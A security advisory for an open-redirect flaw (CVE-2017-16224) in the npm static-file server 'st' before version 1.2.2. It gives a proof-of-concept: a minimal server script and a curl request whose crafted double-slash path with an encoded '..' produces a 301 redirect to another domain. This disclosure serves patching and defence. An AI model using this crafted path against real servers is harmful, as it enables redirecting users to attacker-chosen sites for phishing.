# [M] Open Redirect in st

## Summary
Severity: Medium
Advisory: GHSA-72fg-jqhx-c68p
CVE: CVE-2017-16224
CWE: CWE-601
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2018-08-06
Source: https://github.com/advisories/GHSA-72fg-jqhx-c68p
Type: github-advisory

## Affected
- npm: `st` — affected >=0 <1.2.2

## Details
st is a module for serving static files.

An attacker is able to craft a request that results in an `HTTP 301` (redirect) to an entirely different domain. 

A request for: `http://some.server.com//nodesecurity.org/%2e%2e` would result in a 301 to `//nodesecurity.org/%2e%2e` which most browsers treat as a proper redirect as `//` is translated into the current schema being used.

**Mitigating factor:** 

In order for this to work, `st` must be serving from the root of a server (`/`) rather than the typical sub directory (`/static/`) and the redirect URL will end with some form of URL encoded `..` ("%2e%2e", "%2e.", ".%2e"). 

Code example (provided by Xin Gao): 

[example.js]

```js
var st = require('st') 
var http = require('http') 
http.createServer(st(process.cwd())).listen(1337)
```

```shell
$ curl -v http://localhost:1337//cve.mitre.com/%2e%2e
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 1337 (#0)
> GET //cve.mitre.com/%2e%2e HTTP/1.1
> Host: localhost:1337
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 301 Moved Permanently
< cache-control: public, max-age=600
< last-modified: Fri, 13 Oct 2017 22:56:33 GMT
< etag: "16777220-46488904-1507935393000"
< location: //cve.mitre.com/%2e%2e/
< Date: Fri, 13 Oct 2017 22:56:41 GMT
< Connection: keep-alive
< Content-Length: 30
<
* Connection #0 to host localhost left intact
```


## Recommendation

Update to version 1.2.2 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-16224
- https://github.com/advisories/GHSA-72fg-jqhx-c68p
- https://www.npmjs.com/advisories/547
